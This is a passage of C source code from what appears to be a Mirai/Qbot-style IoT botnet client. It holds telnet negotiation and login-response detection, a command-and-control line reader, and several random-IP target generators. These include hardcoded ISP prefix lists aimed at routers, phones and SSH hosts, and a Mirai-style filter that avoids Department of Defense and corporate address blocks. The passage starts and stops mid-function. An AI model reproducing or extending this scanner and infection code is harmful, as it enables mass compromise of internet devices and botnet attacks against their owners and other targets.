        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
int contains_string(char* buffer, char** strings) {
        int num_strings = 0, i = 0;
        for(num_strings = 0; strings[++num_strings] != 0; );
        for(i = 0; i < num_strings; i++) {
                if(strcasestr(buffer, strings[i])) {
                        return 1;
                }
        }
        return 0;
}
int contains_success(char* buffer) {
        return contains_string(buffer, successes);
}
int contains_fail(char* buffer) {
        return contains_string(buffer, fails);
}
int contains_response(char* buffer) {
        return contains_success(buffer) || contains_fail(buffer);
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size) {       
        fd_set read_set;
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = timeout_usec;
        FD_ZERO(&read_set);
        FD_SET(fd, &read_set);
        if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
        return 0;
        return recv(fd, buffer, buf_size, 0);
}
int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char** strings) {
        int num_bytes, i;
        memset(buffer, 0, buf_size);
        num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
        if(buffer[0] == 0xFF) {
                negotiate(fd, buffer, 3);
        }

        if(contains_string(buffer, strings)) {
                return 1;
        }

        return 0;
}
const char* get_telstate_host(struct telstate_t* telstate) { // get host
        struct in_addr in_addr_ip; 
        in_addr_ip.s_addr = telstate->ip;
        return inet_ntoa(in_addr_ip);
}
void advance_telstate(struct telstate_t* telstate, int new_state) { // advance
        if(new_state == 0) {
                close(telstate->fd);
        }
        telstate->tTimeout = 0;
        telstate->state = new_state;
        memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}
void reset_telstate(struct telstate_t* telstate) { // reset
        advance_telstate(telstate, 0);
        telstate->complete = 1;
}
void trim(char *str) {
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}
static void printchar(unsigned char **str, int c) {
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
        register int pc = 0, padchar = ' ';
        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }
        return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;
        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }
        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';
        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }
        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ) {
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];
        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int zprintf(const unsigned char *format, ...) {
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}
int szprintf(unsigned char *out, const unsigned char *format, ...) {
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}
int sockprintf(int sock, char *formatStr, ...) {
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        zprintf("%s\n", orig);
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}
int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern) {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}
int getHost(unsigned char *toGet, struct in_addr *i) {
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}
void makeRandomStr(unsigned char *buf, int length) {
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
int recvLine(int socket, unsigned char *buf, int bufsize) {
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10) {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1) {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}
int connectTimeout(int fd, char *host, int port, int timeout) {
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }
        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);
        return 1;
}
int listFork() {
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}
int negotiate(int sock, unsigned char *buf, int len) {
        unsigned char c;
        switch (buf[1]) {
        case CMD_IAC: return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;
        default:
                break;
        }

        return 0;
}
int matchPrompt(char *bufStr) {
        char *prompts = ":>%$#\0";
        int bufLen = strlen(bufStr);
        int i, q = 0;
        for(i = 0; i < strlen(prompts); i++) {
                while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
                if(*(bufStr + bufLen - q) == prompts[i]) return 1;
        }
        return 0;
}
uint8_t ipState[5] = {0};
in_addr_t getRandomPublicIP() {
        ipState[0] = rand() % 223;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
        while(
                (ipState[0] == 0) ||
                (ipState[0] == 10) ||
                (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
                (ipState[0] == 127) ||
                (ipState[0] == 169 && ipState[1] == 254) ||
                (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
                (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
                (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
                (ipState[0] == 192 && ipState[1] == 168) ||
                (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
                (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
                (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
                (ipState[0] >= 224)
        )
        {
                ipState[0] = rand() % 223;
                ipState[1] = rand() % 255;
                ipState[2] = rand() % 255;
                ipState[3] = rand() % 255;
        }
        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}

in_addr_t BCMSCAN(){

ipState[0] = 0;
ipState[1] = 0;
ipState[2] = 0;
ipState[3] = 0;
ipState[0] = rand() % 255;
ipState[1] = rand() % 255;
ipState[2] = rand() % 255;
ipState[3] = rand() % 255;
int randnum = rand() % 37;
char ip[16];
if(randnum == 0)
{
szprintf(ip, "37.11.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 1)
{
szprintf(ip, "146.158.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 2)
{
szprintf(ip, "185.4.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 3)
{
szprintf(ip, "188.76.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 4)
{
szprintf(ip, "188.77.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 5)
{
szprintf(ip, "188.78.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 6)
{
szprintf(ip, "188.79.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 7)
{
szprintf(ip, "212.106.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 8)
{
szprintf(ip, "212.9.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 9)
{
szprintf(ip, "213.179.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 10)
{
szprintf(ip, "37.11.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 11)
{
szprintf(ip, "37.132.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 12)
{
szprintf(ip, "37.133.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 13)
{
szprintf(ip, "37.134.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 14)
{
szprintf(ip, "37.135.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 15)
{
szprintf(ip, "37.14.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 16)
{
szprintf(ip, "37.15.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 17)
{
szprintf(ip, "37.35.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 18)
{
szprintf(ip, "37.97.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 19)
{
szprintf(ip, "62.14.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 20)
{
szprintf(ip, "87.216.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 21)
{
szprintf(ip, "87.217.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 22)
{
szprintf(ip, "87.218.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 23)
{
szprintf(ip, "87.219.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 24)
{
szprintf(ip, "87.220.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 25)
{
szprintf(ip, "87.221.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 26)
{
szprintf(ip, "87.222.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 27)
{
szprintf(ip, "87.223.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 28)
{
szprintf(ip, "90.94.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 29)
{
szprintf(ip, "92.191.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 30)
{
szprintf(ip, "95.16.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 31)
{
szprintf(ip, "95.17.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 32)
{
szprintf(ip, "95.18.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 33)
{
szprintf(ip, "95.19.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 34)
{
szprintf(ip, "95.20.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 35)
{
szprintf(ip, "95.21.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 36)
{
szprintf(ip, "95.22.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 37)
{
szprintf(ip, "95.23.%d.%d", ipState[2], ipState[3]);
}
return inet_addr(ip);
}

in_addr_t PhoneScan(){
ipState[0] = 0;
ipState[1] = 0;
ipState[2] = 0;
ipState[3] = 0;
ipState[0] = rand() % 255;
ipState[1] = rand() % 255;
ipState[2] = rand() % 255;
ipState[3] = rand() % 255;
int randnum = rand() % 117;
char ip[16];
if(randnum == 0)
{
szprintf(ip, "119.157.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 1)
{
szprintf(ip, "119.150.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 2)
{
szprintf(ip, "119.151.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 3)
{
szprintf(ip, "119.152.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 4)
{
szprintf(ip, "119.153.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 5)
{
szprintf(ip, "119.154.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 6)
{
szprintf(ip, "119.155.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 7)
{
szprintf(ip, "119.156.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 8)
{
szprintf(ip, "119.157.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 9)
{
szprintf(ip, "119.158.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 10)
{
szprintf(ip, "119.159.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 11)
{
szprintf(ip, "191.24.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 12)
{
szprintf(ip, "187.119.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 13)
{
szprintf(ip, "177.215.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 14)
{
szprintf(ip, "152.241.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 15)
{
szprintf(ip, "182.185.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 16)
{
szprintf(ip, "179.80.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 17)
{
szprintf(ip, "179.81.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 18)
{
szprintf(ip, "179.82.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 19)
{
szprintf(ip, "179.83.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 20)
{
szprintf(ip, "179.84.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 21)
{
szprintf(ip, "179.86.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 22)
{
szprintf(ip, "179.87.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 23)
{
szprintf(ip, "179.88.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 24)
{
szprintf(ip, "179.89.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 25)
{
szprintf(ip, "179.90.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 26)
{
szprintf(ip, "179.91.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 27)
{
szprintf(ip, "179.92.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 28)
{
szprintf(ip, "179.93.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 29)
{
szprintf(ip, "179.94.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 30)
{
szprintf(ip, "179.95.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 31)
{
szprintf(ip, "179.96.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 32)
{
szprintf(ip, "179.97.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 33)
{
szprintf(ip, "179.98.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 34)
{
szprintf(ip, "179.99.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 35)
{
szprintf(ip, "152.240.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 36)
{
szprintf(ip, "152.241.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 37)
{
szprintf(ip, "152.242.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 38)
{
szprintf(ip, "152.243.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 39)
{
szprintf(ip, "152.244.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 40)
{
szprintf(ip, "152.245.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 41)
{
szprintf(ip, "152.246.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 42)
{
szprintf(ip, "152.247.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 43)
{
szprintf(ip, "152.248.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 44)
{
szprintf(ip, "152.249.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 45)
{
szprintf(ip, "182.189.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 46)
{
szprintf(ip, "182.190.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 47)
{
szprintf(ip, "182.191.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 48)
{
szprintf(ip, "182.188.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 49)
{
szprintf(ip, "182.187.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 50)
{
szprintf(ip, "182.186.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 51)
{
szprintf(ip, "182.185.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 52)
{
szprintf(ip, "182.184.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 53)
{
szprintf(ip, "179.100.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 54)
{
szprintf(ip, "179.101.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 55)
{
szprintf(ip, "179.102.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 56)
{
szprintf(ip, "179.103.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 57)
{
szprintf(ip, "179.110.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 58)
{
szprintf(ip, "179.111.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 59)
{
szprintf(ip, "179.112.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 60)
{
szprintf(ip, "179.113.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 61)
{
szprintf(ip, "179.114.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 62)
{
szprintf(ip, "179.115.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 63)
{
szprintf(ip, "179.116.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 64)
{
szprintf(ip, "179.117.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 65)
{
szprintf(ip, "191.193.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 66)
{
szprintf(ip, "191.194.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 67)
{
szprintf(ip, "191.195.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 68)
{
szprintf(ip, "191.196.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 69)
{
szprintf(ip, "191.197.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 70)
{
szprintf(ip, "191.198.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 71)
{
szprintf(ip, "152.250.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 72)
{
szprintf(ip, "152.251.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 73)
{
szprintf(ip, "152.252.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 74)
{
szprintf(ip, "152.253.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 75)
{
szprintf(ip, "152.254.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 76)
{
szprintf(ip, "152.255.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 77)
{
szprintf(ip, "177.112.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 78)
{
szprintf(ip, "177.113.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 79)
{
szprintf(ip, "177.114.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 80)
{
szprintf(ip, "177.115.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 81)
{
szprintf(ip, "177.116.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 82)
{
szprintf(ip, "177.117.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 83)
{
szprintf(ip, "177.118.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 84)
{
szprintf(ip, "177.119.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 85)
{
szprintf(ip, "177.120.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 86)
{
szprintf(ip, "177.121.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 87)
{
szprintf(ip, "177.138.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 88)
{
szprintf(ip, "177.139.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 89)
{
szprintf(ip, "177.144.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 90)
{
szprintf(ip, "177.145.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 91)
{
szprintf(ip, "177.146.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 92)
{
szprintf(ip, "177.147.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 93)
{
szprintf(ip, "177.160.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 94)
{
szprintf(ip, "177.161.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 95)
{
szprintf(ip, "177.162.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 96)
{
szprintf(ip, "177.163.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 97)
{
szprintf(ip, "177.168.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 98)
{
szprintf(ip, "177.169.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 99)
{
szprintf(ip, "177.170.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 100)
{
szprintf(ip, "177.171.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 101)
{
szprintf(ip, "177.172.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 102)
{
szprintf(ip, "189.96.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 103)
{
szprintf(ip, "189.97.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 104)
{
szprintf(ip, "189.98.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 105)
{
szprintf(ip, "189.99.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 106)
{
szprintf(ip, "39.34.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 107)
{
szprintf(ip, "59.103.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 108)
{
szprintf(ip, "191.12.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 109)
{
szprintf(ip, "186.117.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 110)
{
szprintf(ip, "179.131.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 111)
{
szprintf(ip, "179.129.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 112)
{
szprintf(ip, "179.170.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 113)
{
szprintf(ip, "191.206.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 114)
{
szprintf(ip, "187.118.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 115)
{
szprintf(ip, "187.116.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 116)
{
szprintf(ip, "179.224.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 117)
{
szprintf(ip, "179.166.%d.%d", ipState[2], ipState[3]);
}
return inet_addr(ip);
}

static ipv4_t MiraiIPRanges(void){

    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
    do
    {
        tmp = rand_cmwc();
        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );
char ip[16];
szprintf(ip, "%d.%d.%d.%d", o1,  o2, o3, o4);
return INET_ADDR(o1,o2,o3,o4);
}

in_addr_t sshranges(){

ipState[0] = 0;
ipState[1] = 0;
ipState[2] = 0;
ipState[3] = 0;
ipState[0] = rand() % 255;
ipState[1] = rand() % 255;
ipState[2] = rand() % 255;
ipState[3] = rand() % 255;
int randnum = rand() % 40;
char ip[16];
if(randnum == 0)
{
szprintf(ip, "124.105.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 1)
{
szprintf(ip, "119.93.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 2)
{
szprintf(ip, "122.54.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 3)
{
szprintf(ip, "122.52.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 4)
{
szprintf(ip, "122.3.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 5)
{
szprintf(ip, "5.78.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 6)
{
szprintf(ip, "91.98.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 7)
{
szprintf(ip, "49.150.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 8)
{
szprintf(ip, "191.80.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 9)
{
szprintf(ip, "191.81.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 10)
{
szprintf(ip, "191.82.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 11)
{
szprintf(ip, "191.83.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 12)
{
szprintf(ip, "191.84.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 13)
{
szprintf(ip, "191.85.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 14)
{
szprintf(ip, "122.3.%d.%d", ipState[2], ipState[3]);
}
if(randnum == 15)
{
